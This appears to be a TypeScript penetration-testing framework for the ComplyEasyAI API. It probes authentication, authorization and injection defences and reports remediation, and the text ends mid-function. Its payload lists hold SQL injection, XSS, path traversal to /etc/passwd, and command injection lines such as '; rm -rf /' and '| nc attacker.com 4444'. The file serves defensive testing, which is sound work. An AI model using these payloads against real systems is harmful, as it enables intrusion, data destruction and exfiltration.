/**
 * Penetration Testing Framework
 *
 * Comprehensive security testing engine for ComplyEasyAI API.
 * Tests cover OWASP Top 10 vulnerability categories including:
 * - Authentication & Session Management
 * - Authorization & Access Control
 * - Injection (SQL, XSS, Command, LDAP, NoSQL)
 * - CSRF Protection
 * - Rate Limiting
 * - Security Headers
 * - SSRF Prevention
 * - Data Protection
 *
 * Usage:
 *   npm run test:security
 *   npm run test -- --testPathPattern=__tests__/security
 *
 * Environment:
 *   API_URL - Base URL of the API (default: http://localhost:3001)
 */

import axios, { AxiosError, AxiosResponse } from 'axios';

// ============================================================================
// TYPES
// ============================================================================

export interface SecurityTestConfig {
  /** Base URL of the API under test */
  baseUrl: string;
  /** Request timeout in milliseconds */
  timeout: number;
  /** Enable verbose logging */
  verbose: boolean;
}

export interface SecurityTestResult {
  /** Unique test identifier */
  id: string;
  /** Test category (e.g., 'Authentication', 'Injection') */
  category: string;
  /** Human-readable test name */
  testName: string;
  /** Description of what the test validates */
  description: string;
  /** Severity level of the finding */
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  /** Test outcome */
  status: 'pass' | 'fail' | 'warning' | 'error';
  /** Detailed test results or findings */
  details: string;
  /** Evidence supporting the finding (response snippets, headers, etc.) */
  evidence?: string;
  /** Recommended fix for the vulnerability */
  remediation?: string;
  /** OWASP Top 10 reference (e.g., 'A01:2021') */
  owasp?: string;
  /** When the test was executed */
  timestamp: Date;
  /** How long the test took in milliseconds */
  durationMs: number;
}

export interface PenetrationTestReport {
  /** When the test suite was executed */
  testDate: Date;
  /** Target environment identifier */
  environment: string;
  /** Total number of tests executed */
  totalTests: number;
  /** Number of tests that passed */
  passed: number;
  /** Number of tests that failed */
  failed: number;
  /** Number of tests with warnings */
  warnings: number;
  /** Count of critical severity findings */
  criticalFindings: number;
  /** Count of high severity findings */
  highFindings: number;
  /** Count of medium severity findings */
  mediumFindings: number;
  /** Count of low severity findings */
  lowFindings: number;
  /** All individual test results */
  results: SecurityTestResult[];
}

// ============================================================================
// SQL INJECTION PAYLOADS
// ============================================================================

const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "'; DROP TABLE users; --",
  "' UNION SELECT * FROM users --",
  "1' AND 1=1 --",
  "admin'--",
  "' OR 1=1#",
  "'; EXEC xp_cmdshell('whoami'); --",
];

// ============================================================================
// XSS PAYLOADS
// ============================================================================

const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '"><script>alert(1)</script>',
  "javascript:alert('XSS')",
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  '{{constructor.constructor("return this")()}}',
  '<iframe src="javascript:alert(1)">',
];

// ============================================================================
// COMMAND INJECTION PAYLOADS
// ============================================================================

const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(whoami)',
  '; rm -rf /',
  '| nc attacker.com 4444',
  '\n/bin/sh',
  '& dir',
];

// ============================================================================
// PATH TRAVERSAL PAYLOADS
// ============================================================================

const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '/etc/passwd%00',
  '....\\....\\....\\etc\\passwd',
  '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
];

// ============================================================================
// NOSQL INJECTION PAYLOADS
// ============================================================================

const NOSQL_INJECTION_PAYLOADS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$regex": ".*"}',
  '{"$where": "1==1"}',
  '{"$or": [{"a": 1}, {"b": 2}]}',
];

// ============================================================================
// SECURITY TEST ENGINE
// ============================================================================

export class SecurityTestEngine {
  private config: SecurityTestConfig;
  private results: SecurityTestResult[] = [];
  private testCounter: number = 0;

  constructor(config: Partial<SecurityTestConfig> = {}) {
    this.config = {
      baseUrl: config.baseUrl || process.env.API_URL || 'http://localhost:3001',
      timeout: config.timeout ?? 10000,
      verbose: config.verbose ?? false,
    };
  }

  // ==========================================================================
  // PUBLIC API
  // ==========================================================================

  /**
   * Run all security test categories and produce a full report.
   */
  async runAllTests(): Promise<PenetrationTestReport> {
    this.results = [];
    this.testCounter = 0;

    this.log('Starting penetration test suite...');
    this.log(`Target: ${this.config.baseUrl}`);

    await this.runAuthenticationTests();
    await this.runAuthorizationTests();
    await this.runInjectionTests();
    await this.runCSRFTests();
    await this.runRateLimitingTests();
    await this.runSecurityHeaderTests();
    await this.runSSRFTests();
    await this.runDataProtectionTests();

    return this.buildReport();
  }

  /**
   * Generate a markdown report from a PenetrationTestReport.
   */
  generateReport(report: PenetrationTestReport): string {
    const lines: string[] = [];

    lines.push('# Penetration Test Report');
    lines.push('');
    lines.push(`**Test Date:** ${report.testDate.toISOString()}`);
    lines.push(`**Environment:** ${report.environment}`);
    lines.push('');

    // Summary
    lines.push('## Summary');
    lines.push('');
    lines.push('| Metric | Value |');
    lines.push('|--------|-------|');
    lines.push(`| Total Tests | ${report.totalTests} |`);
    lines.push(`| Passed | ${report.passed} |`);
    lines.push(`| Failed | ${report.failed} |`);
    lines.push(`| Warnings | ${report.warnings} |`);
    lines.push(`| Critical Findings | ${report.criticalFindings} |`);
    lines.push(`| High Findings | ${report.highFindings} |`);
    lines.push(`| Medium Findings | ${report.mediumFindings} |`);
    lines.push(`| Low Findings | ${report.lowFindings} |`);
    lines.push('');

    // Risk Assessment
    const overallRisk =
      report.criticalFindings > 0
        ? 'CRITICAL'
        : report.highFindings > 0
          ? 'HIGH'
          : report.mediumFindings > 0
            ? 'MEDIUM'
            : report.lowFindings > 0
              ? 'LOW'
              : 'PASS';

    lines.push(`## Overall Risk Level: **${overallRisk}**`);
    lines.push('');

    // Group results by category
    const categories = new Map<string, SecurityTestResult[]>();
    for (const result of report.results) {
      const existing = categories.get(result.category) || [];
      existing.push(result);
      categories.set(result.category, existing);
    }

    for (const [category, categoryResults] of categories) {
      lines.push(`## ${category}`);
      lines.push('');

      for (const result of categoryResults) {
        const statusIcon =
          result.status === 'pass'
            ? 'PASS'
            : result.status === 'fail'
              ? 'FAIL'
              : result.status === 'warning'
                ? 'WARN'
                : 'ERROR';

        lines.push(
          `### [${statusIcon}] ${result.testName} (${result.severity.toUpperCase()})`
        );
        lines.push('');
        lines.push(`**Description:** ${result.description}`);
        lines.push('');
        lines.push(`**Details:** ${result.details}`);
        lines.push('');

        if (result.owasp) {
          lines.push(`**OWASP Reference:** ${result.owasp}`);
          lines.push('');
        }

        if (result.evidence) {
          lines.push('**Evidence:**');
          lines.push('```');
          lines.push(result.evidence);
          lines.push('```');
          lines.push('');
        }

        if (result.remediation) {
          lines.push(`**Remediation:** ${result.remediation}`);
          lines.push('');
        }

        lines.push(`**Duration:** ${result.durationMs}ms`);
        lines.push('');
        lines.push('---');
        lines.push('');
      }
    }

    // Footer
    lines.push('## Disclaimer');
    lines.push('');
    lines.push(
      'This report was generated by the ComplyEasyAI automated penetration testing framework. '
      + 'Results should be validated by a qualified security professional. '
      + 'False positives may occur; manual verification is recommended for all findings.'
    );

    return lines.join('\n');
  }

  // ==========================================================================
  // AUTHENTICATION TESTS
  // ==========================================================================

  async runAuthenticationTests(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    results.push(await this.testExpiredJWT());
    results.push(await this.testMalformedJWT());
    results.push(await this.testMissingAuth());
    results.push(await this.testBruteForce());
    results.push(await this.testSQLInjectionInLogin());
    results.push(await this.testTimingAttack());
    results.push(await this.testTokenReuse());
    results.push(await this.testSessionFixation());

    return results;
  }

  /**
   * AUTH-001: Verify expired JWT tokens are rejected.
   */
  async testExpiredJWT(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authentication',
      testName: 'Expired JWT Token Rejection',
      description:
        'Verify that expired JWT tokens are properly rejected with 401 Unauthorized',
      severity: 'critical',
      owasp: 'A07:2021 - Identification and Authentication Failures',
      fn: async () => {
        // Craft an expired JWT (header.payload.signature with exp in the past)
        const expiredToken =
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' +
          'eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNTAwMDAwMDAwfQ.' +
          'invalid-signature';

        const response = await this.request('GET', '/api/v1/frameworks', {
          headers: { Authorization: `Bearer ${expiredToken}` },
        });

        if (response.status === 401) {
          return {
            status: 'pass' as const,
            details: 'Expired JWT tokens are properly rejected with 401',
          };
        }

        return {
          status: 'fail' as const,
          details: `Expected 401, got ${response.status}. Expired tokens may be accepted.`,
          evidence: `Response status: ${response.status}`,
          remediation:
            'Ensure JWT middleware validates the exp claim and rejects expired tokens',
        };
      },
    });
  }

  /**
   * AUTH-002: Verify malformed/tampered JWT tokens are rejected.
   */
  async testMalformedJWT(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authentication',
      testName: 'Malformed JWT Token Rejection',
      description:
        'Verify that malformed or tampered JWT tokens are rejected with 401',
      severity: 'critical',
      owasp: 'A07:2021 - Identification and Authentication Failures',
      fn: async () => {
        const malformedTokens = [
          'not-a-jwt-token',
          'a.b.c',
          'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.',
          'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.tampered-sig',
          '',
        ];

        const failures: string[] = [];

        for (const token of malformedTokens) {
          const response = await this.request('GET', '/api/v1/frameworks', {
            headers: { Authorization: `Bearer ${token}` },
          });

          if (response.status !== 401) {
            failures.push(
              `Token "${token.substring(0, 20)}..." returned ${response.status}`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'All malformed JWT tokens are properly rejected with 401',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} malformed tokens were not rejected`,
          evidence: failures.join('\n'),
          remediation:
            'Validate JWT structure, algorithm, and signature before accepting tokens',
        };
      },
    });
  }

  /**
   * AUTH-003: Verify requests without Authorization header are rejected.
   */
  async testMissingAuth(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authentication',
      testName: 'Missing Authorization Header',
      description:
        'Verify that protected endpoints reject requests without Authorization header',
      severity: 'critical',
      owasp: 'A07:2021 - Identification and Authentication Failures',
      fn: async () => {
        const protectedEndpoints = [
          '/api/v1/frameworks',
          '/api/v1/frameworks',
          '/api/v1/risks',
          '/api/v1/team',
        ];

        const failures: string[] = [];

        for (const endpoint of protectedEndpoints) {
          const response = await this.request('GET', endpoint);

          if (response.status !== 401 && response.status !== 403) {
            failures.push(`${endpoint} returned ${response.status}`);
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'All protected endpoints reject unauthenticated requests',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} endpoints accessible without authentication`,
          evidence: failures.join('\n'),
          remediation:
            'Apply authentication middleware to all protected routes',
        };
      },
    });
  }

  /**
   * AUTH-004: Verify brute force protection via rate limiting on login.
   */
  async testBruteForce(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authentication',
      testName: 'Brute Force Protection',
      description:
        'Verify that rapid login attempts trigger rate limiting (429 Too Many Requests)',
      severity: 'high',
      owasp: 'A07:2021 - Identification and Authentication Failures',
      fn: async () => {
        const attempts = 10;
        let rateLimited = false;
        let lastStatus = 0;

        for (let i = 0; i < attempts; i++) {
          const response = await this.request('POST', '/api/v1/auth/login', {
            data: {
              email: `brute-force-test-${i}@example.com`,
              password: 'wrongpassword',
            },
          });

          lastStatus = response.status;

          if (response.status === 429) {
            rateLimited = true;
            break;
          }
        }

        if (rateLimited) {
          return {
            status: 'pass' as const,
            details: `Rate limiting triggered after rapid login attempts (429 received)`,
          };
        }

        return {
          status: 'warning' as const,
          details: `Sent ${attempts} rapid login attempts without triggering rate limiting. Last status: ${lastStatus}`,
          remediation:
            'Implement rate limiting on authentication endpoints (recommend 5 attempts per 15 minutes)',
        };
      },
    });
  }

  /**
   * AUTH-005: Verify SQL injection in login fields is prevented.
   */
  async testSQLInjectionInLogin(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authentication',
      testName: 'SQL Injection in Login',
      description:
        'Verify that SQL injection payloads in login email/password fields are rejected safely',
      severity: 'critical',
      owasp: 'A03:2021 - Injection',
      fn: async () => {
        const failures: string[] = [];

        for (const payload of SQL_INJECTION_PAYLOADS.slice(0, 4)) {
          // Test in email field
          const emailResponse = await this.request(
            'POST',
            '/api/v1/auth/login',
            {
              data: { email: payload, password: 'password' },
            }
          );

          if (
            emailResponse.status === 200 ||
            emailResponse.status === 500
          ) {
            failures.push(
              `Email field: "${payload}" returned ${emailResponse.status}`
            );
          }

          // Test in password field
          const pwResponse = await this.request(
            'POST',
            '/api/v1/auth/login',
            {
              data: { email: 'test@example.com', password: payload },
            }
          );

          if (pwResponse.status === 200 || pwResponse.status === 500) {
            failures.push(
              `Password field: "${payload}" returned ${pwResponse.status}`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'SQL injection payloads in login fields are handled safely (no 200 or 500 responses)',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} SQL injection payloads caused unexpected responses`,
          evidence: failures.join('\n'),
          remediation:
            'Use parameterized queries (Prisma ORM already provides this). Validate input format.',
        };
      },
    });
  }

  /**
   * AUTH-006: Verify login endpoint doesn't leak timing information.
   */
  async testTimingAttack(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authentication',
      testName: 'Timing Attack Resistance',
      description:
        'Verify that response times for valid vs invalid emails are similar (prevents user enumeration)',
      severity: 'medium',
      owasp: 'A07:2021 - Identification and Authentication Failures',
      fn: async () => {
        const validEmailTimings: number[] = [];
        const invalidEmailTimings: number[] = [];
        const iterations = 5;

        // Measure timing for a likely non-existent email
        for (let i = 0; i < iterations; i++) {
          const start = Date.now();
          await this.request('POST', '/api/v1/auth/login', {
            data: {
              email: `nonexistent-timing-test-${i}@example.com`,
              password: 'testpassword123',
            },
          });
          invalidEmailTimings.push(Date.now() - start);
        }

        // Measure timing for a potentially valid format
        for (let i = 0; i < iterations; i++) {
          const start = Date.now();
          await this.request('POST', '/api/v1/auth/login', {
            data: {
              email: 'admin@complyeasy.com',
              password: 'wrongpassword',
            },
          });
          validEmailTimings.push(Date.now() - start);
        }

        const avgInvalid =
          invalidEmailTimings.reduce((a, b) => a + b, 0) /
          invalidEmailTimings.length;
        const avgValid =
          validEmailTimings.reduce((a, b) => a + b, 0) /
          validEmailTimings.length;
        const timingDiff = Math.abs(avgValid - avgInvalid);

        // Allow up to 200ms difference (network jitter tolerance)
        if (timingDiff < 200) {
          return {
            status: 'pass' as const,
            details: `Timing difference: ${timingDiff.toFixed(0)}ms (within 200ms tolerance). Invalid email avg: ${avgInvalid.toFixed(0)}ms, valid email avg: ${avgValid.toFixed(0)}ms`,
          };
        }

        return {
          status: 'warning' as const,
          details: `Timing difference: ${timingDiff.toFixed(0)}ms exceeds 200ms tolerance`,
          evidence: `Invalid email avg: ${avgInvalid.toFixed(0)}ms, Valid email avg: ${avgValid.toFixed(0)}ms`,
          remediation:
            'Use constant-time comparison for authentication. Return the same error and processing time for valid and invalid emails.',
        };
      },
    });
  }

  /**
   * AUTH-007: Verify revoked/blacklisted tokens are rejected.
   */
  async testTokenReuse(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authentication',
      testName: 'Revoked Token Rejection',
      description:
        'Verify that previously blacklisted or revoked tokens are rejected',
      severity: 'high',
      owasp: 'A07:2021 - Identification and Authentication Failures',
      fn: async () => {
        // Use a known-invalid token that mimics a revoked token structure
        const revokedToken =
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' +
          'eyJzdWIiOiJyZXZva2VkLXVzZXIiLCJleHAiOjk5OTk5OTk5OTl9.' +
          'revoked-signature';

        const response = await this.request('GET', '/api/v1/frameworks', {
          headers: { Authorization: `Bearer ${revokedToken}` },
        });

        if (response.status === 401) {
          return {
            status: 'pass' as const,
            details: 'Invalid/revoked tokens are properly rejected with 401',
          };
        }

        return {
          status: 'fail' as const,
          details: `Expected 401 for revoked token, got ${response.status}`,
          remediation:
            'Implement a token blacklist (Redis-based) and check against it on each request',
        };
      },
    });
  }

  /**
   * AUTH-008: Verify session fixation protection.
   */
  async testSessionFixation(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authentication',
      testName: 'Session Fixation Protection',
      description:
        'Verify that session tokens cannot be reused across different authentication contexts',
      severity: 'high',
      owasp: 'A07:2021 - Identification and Authentication Failures',
      fn: async () => {
        // Try to use an arbitrary session token
        const fixedToken =
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' +
          'eyJzdWIiOiJmaXhlZC1zZXNzaW9uIiwiaWF0IjoxNjAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.' +
          'fixed-session-signature';

        const response = await this.request('GET', '/api/v1/frameworks', {
          headers: { Authorization: `Bearer ${fixedToken}` },
        });

        if (response.status === 401) {
          return {
            status: 'pass' as const,
            details:
              'Session fixation attempt rejected. Tokens are validated against server-side state.',
          };
        }

        return {
          status: 'fail' as const,
          details: `Session fixation may be possible. Got ${response.status} instead of 401.`,
          remediation:
            'Regenerate session identifiers on authentication. Validate tokens against server-side session store.',
        };
      },
    });
  }

  // ==========================================================================
  // AUTHORIZATION TESTS
  // ==========================================================================

  async runAuthorizationTests(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    results.push(await this.testIDOR());
    results.push(await this.testRoleEscalation());
    results.push(await this.testHorizontalPrivilege());
    results.push(await this.testMissingOrgScope());
    results.push(await this.testDirectObjectReference());
    results.push(await this.testFunctionLevelAuth());

    return results;
  }

  /**
   * AUTHZ-001: Test for Insecure Direct Object Reference (IDOR).
   */
  async testIDOR(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authorization',
      testName: 'Insecure Direct Object Reference (IDOR)',
      description:
        'Verify that resources cannot be accessed by manipulating IDs to reference another organization',
      severity: 'critical',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        // Try accessing resources with fabricated UUIDs
        const fakeOrgId = '00000000-0000-0000-0000-000000000001';
        const fakeResourceId = '00000000-0000-0000-0000-000000000099';

        const endpoints = [
          `/api/v1/frameworks/${fakeResourceId}`,
          `/api/v1/risks/${fakeResourceId}`,
          `/api/v1/organization`,
        ];

        const failures: string[] = [];

        for (const endpoint of endpoints) {
          const response = await this.request('GET', endpoint);

          // Should get 401 (unauthenticated) or 403 (forbidden) or 404 (not found)
          // A 200 with data would indicate IDOR vulnerability
          if (response.status === 200 && response.data) {
            failures.push(`${endpoint} returned 200 with data`);
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'IDOR attempts properly blocked. Resources are not accessible via ID manipulation.',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} endpoints vulnerable to IDOR`,
          evidence: failures.join('\n'),
          remediation:
            'Enforce ownership checks: verify the requesting user belongs to the organization that owns the resource',
        };
      },
    });
  }

  /**
   * AUTHZ-002: Test for privilege escalation to admin role.
   */
  async testRoleEscalation(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authorization',
      testName: 'Role Escalation Prevention',
      description:
        'Verify that non-admin users cannot access admin-only endpoints',
      severity: 'critical',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        const adminEndpoints = [
          '/api/v1/admin/users',
          '/api/v1/admin/organizations',
          '/api/v1/admin/settings',
          '/api/v1/admin/audit-log',
        ];

        const failures: string[] = [];

        // Test without any token (should be 401 or 403)
        for (const endpoint of adminEndpoints) {
          const response = await this.request('GET', endpoint);

          if (response.status === 200) {
            failures.push(
              `${endpoint} accessible without authentication (${response.status})`
            );
          }
        }

        // Test with a non-admin token
        const fakeUserToken =
          'eyJhbGciOiJIUzI1NiJ9.' +
          'eyJzdWIiOiJ1c2VyLTEiLCJyb2xlIjoidXNlciIsImV4cCI6OTk5OTk5OTk5OX0.' +
          'fake-user-sig';

        for (const endpoint of adminEndpoints) {
          const response = await this.request('GET', endpoint, {
            headers: { Authorization: `Bearer ${fakeUserToken}` },
          });

          if (response.status === 200) {
            failures.push(
              `${endpoint} accessible with non-admin token (${response.status})`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details: 'Admin endpoints properly restrict access by role',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} admin endpoints accessible without proper authorization`,
          evidence: failures.join('\n'),
          remediation:
            'Apply role-based access control middleware to admin routes. Verify role claim in JWT.',
        };
      },
    });
  }

  /**
   * AUTHZ-003: Test for horizontal privilege escalation between users.
   */
  async testHorizontalPrivilege(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authorization',
      testName: 'Horizontal Privilege Escalation',
      description:
        'Verify that users cannot access other users data within the same org',
      severity: 'high',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        const otherUserId = '00000000-0000-0000-0000-000000000002';

        const endpoints = [
          `/api/v1/team`,
          `/api/v1/organization`,
          `/api/v1/audit`,
        ];

        const failures: string[] = [];

        for (const endpoint of endpoints) {
          const response = await this.request('GET', endpoint);

          if (response.status === 200) {
            failures.push(`${endpoint} returned 200 (data accessible)`);
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'Horizontal privilege escalation properly prevented. User-specific endpoints require proper ownership.',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} endpoints vulnerable to horizontal privilege escalation`,
          evidence: failures.join('\n'),
          remediation:
            'Verify requesting user ID matches the resource owner ID before granting access',
        };
      },
    });
  }

  /**
   * AUTHZ-004: Verify all data endpoints filter by organizationId.
   */
  async testMissingOrgScope(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authorization',
      testName: 'Organization Scope Enforcement',
      description:
        'Verify that all data endpoints enforce organizationId scoping to prevent cross-tenant data access',
      severity: 'critical',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        const dataEndpoints = [
          '/api/v1/frameworks',
          '/api/v1/risks',
          '/api/v1/control-mappings',
          '/api/v1/evidence-versions/control/test-id',
        ];

        const failures: string[] = [];

        for (const endpoint of dataEndpoints) {
          // Try without org context
          const response = await this.request('GET', endpoint);

          // If 200 without authentication, org scoping may be missing
          if (response.status === 200) {
            failures.push(
              `${endpoint} returned data without authentication or org context`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'All data endpoints require authentication (which enforces org scope)',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} endpoints may lack organization scoping`,
          evidence: failures.join('\n'),
          remediation:
            'Ensure all queries include WHERE organizationId = :orgId extracted from the authenticated user context',
        };
      },
    });
  }

  /**
   * AUTHZ-005: Test direct object reference without proper ownership.
   */
  async testDirectObjectReference(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authorization',
      testName: 'Direct Object Reference Protection',
      description:
        'Verify that resources enforce ownership validation, not just existence',
      severity: 'high',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        // Try sequential and predictable IDs
        const predictableIds = ['1', '2', '100', '999'];
        const failures: string[] = [];

        for (const id of predictableIds) {
          const response = await this.request(
            'GET',
            `/api/v1/frameworks/${id}`
          );

          if (response.status === 200) {
            failures.push(
              `Framework ${id} accessible via predictable ID`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'Predictable/sequential IDs do not grant access to resources without proper authentication',
          };
        }

        return {
          status: 'warning' as const,
          details: `${failures.length} resources accessible via predictable IDs`,
          evidence: failures.join('\n'),
          remediation:
            'Use UUIDs for resource identifiers. Always validate ownership in addition to existence.',
        };
      },
    });
  }

  /**
   * AUTHZ-006: Test function-level authorization for each role.
   */
  async testFunctionLevelAuth(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Authorization',
      testName: 'Function-Level Authorization',
      description:
        'Verify that destructive operations (PUT, DELETE) require proper authorization',
      severity: 'high',
      owasp: 'A01:2021 - Broken Access Control',
      fn: async () => {
        const destructiveOps = [
          { method: 'DELETE' as const, path: '/api/v1/frameworks/test-id' },
          {
            method: 'PUT' as const,
            path: '/api/v1/frameworks/test-id',
            data: { name: 'hacked' },
          },
          { method: 'DELETE' as const, path: '/api/v1/risks/test-id' },
          {
            method: 'POST' as const,
            path: '/api/v1/team',
            data: { email: 'hack@example.com', role: 'admin' },
          },
        ];

        const failures: string[] = [];

        for (const op of destructiveOps) {
          const response = await this.request(op.method, op.path, {
            data: op.data,
          });

          if (response.status === 200 || response.status === 204) {
            failures.push(
              `${op.method} ${op.path} returned ${response.status} without auth`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'All destructive operations require proper authorization',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} destructive operations lack proper authorization`,
          evidence: failures.join('\n'),
          remediation:
            'Apply role-based checks for all state-changing operations (POST, PUT, DELETE)',
        };
      },
    });
  }

  // ==========================================================================
  // INJECTION TESTS
  // ==========================================================================

  async runInjectionTests(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    results.push(await this.testSQLInjection());
    results.push(await this.testXSSReflected());
    results.push(await this.testXSSStored());
    results.push(await this.testCommandInjection());
    results.push(await this.testLDAPInjection());
    results.push(await this.testHeaderInjection());
    results.push(await this.testPathTraversal());
    results.push(await this.testNoSQLInjection());

    return results;
  }

  /**
   * INJ-001: Test SQL injection across query parameters and request body.
   */
  async testSQLInjection(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Injection',
      testName: 'SQL Injection',
      description:
        'Test various SQL injection payloads in query parameters and request body fields',
      severity: 'critical',
      owasp: 'A03:2021 - Injection',
      fn: async () => {
        const failures: string[] = [];

        for (const payload of SQL_INJECTION_PAYLOADS) {
          // Test in query parameter
          const queryResponse = await this.request(
            'GET',
            `/api/v1/frameworks?search=${encodeURIComponent(payload)}`
          );

          if (queryResponse.status === 500) {
            failures.push(
              `Query param SQL injection caused 500: "${payload}"`
            );
          }

          // Test in request body
          const bodyResponse = await this.request(
            'POST',
            '/api/v1/frameworks',
            {
              data: { name: payload, description: payload },
            }
          );

          if (bodyResponse.status === 500) {
            failures.push(
              `Body SQL injection caused 500: "${payload}"`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details: `Tested ${SQL_INJECTION_PAYLOADS.length} SQL injection payloads. No server errors triggered.`,
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} SQL injection payloads caused server errors`,
          evidence: failures.join('\n'),
          remediation:
            'Use parameterized queries exclusively (Prisma ORM). Add input validation layer.',
        };
      },
    });
  }

  /**
   * INJ-002: Test reflected XSS in API responses.
   */
  async testXSSReflected(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Injection',
      testName: 'Reflected XSS',
      description:
        'Verify that XSS payloads in input fields are not reflected in API responses',
      severity: 'high',
      owasp: 'A03:2021 - Injection',
      fn: async () => {
        const failures: string[] = [];

        for (const payload of XSS_PAYLOADS) {
          const response = await this.request(
            'GET',
            `/api/v1/frameworks?search=${encodeURIComponent(payload)}`
          );

          const responseBody =
            typeof response.data === 'string'
              ? response.data
              : JSON.stringify(response.data || '');

          // Check if the payload is reflected back unescaped
          if (
            responseBody.includes(payload) &&
            !responseBody.includes(this.escapeHtml(payload))
          ) {
            failures.push(
              `XSS payload reflected unescaped: "${payload.substring(0, 30)}..."`
            );
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details: `Tested ${XSS_PAYLOADS.length} XSS payloads. No unescaped reflections detected.`,
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} XSS payloads reflected in responses`,
          evidence: failures.join('\n'),
          remediation:
            'Sanitize all user input. Set Content-Type to application/json. Implement CSP headers.',
        };
      },
    });
  }

  /**
   * INJ-003: Test stored XSS via framework/risk creation endpoints.
   */
  async testXSSStored(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Injection',
      testName: 'Stored XSS',
      description:
        'Verify that XSS payloads in stored data (framework names, risk descriptions) are sanitized',
      severity: 'high',
      owasp: 'A03:2021 - Injection',
      fn: async () => {
        const failures: string[] = [];

        for (const payload of XSS_PAYLOADS.slice(0, 4)) {
          const response = await this.request(
            'POST',
            '/api/v1/frameworks',
            {
              data: {
                name: payload,
                description: `Test stored XSS: ${payload}`,
              },
            }
          );

          // If stored, check that returned data is sanitized
          if (response.status === 201 || response.status === 200) {
            const responseBody = JSON.stringify(response.data || '');
            if (responseBody.includes('<script>')) {
              failures.push(
                `Stored XSS payload not sanitized: "${payload.substring(0, 30)}..."`
              );
            }
          }
        }

        if (failures.length === 0) {
          return {
            status: 'pass' as const,
            details:
              'Stored XSS payloads are either rejected or sanitized before storage',
          };
        }

        return {
          status: 'fail' as const,
          details: `${failures.length} stored XSS payloads not sanitized`,
          evidence: failures.join('\n'),
          remediation:
            'Sanitize all input before database storage. Use HTML encoding on output. Implement Content-Security-Policy.',
        };
      },
    });
  }

  /**
   * INJ-004: Test OS command injection in file paths and names.
   */
  async testCommandInjection(): Promise<SecurityTestResult> {
    return this.runTest({
      category: 'Injection',
      testName: 'Command Injection',
      description:
        'Verify that OS command injection payloads in file paths and names are rejected',
      severity: 'critical',
      owasp: 'A03:2021 - Injection',
      fn: async () => {
        const failures: string[] = [];

        for (const payload of COMMAND_INJECTION_PAYLOADS) {
          const response = await this.request(
            'POST',
            '/api/v1/evidence-versions/control/test-id',
            {
              data: { fileName: payload, filePath: payload },
            }
          );

          if (response.status === 500) {
            failures.push(
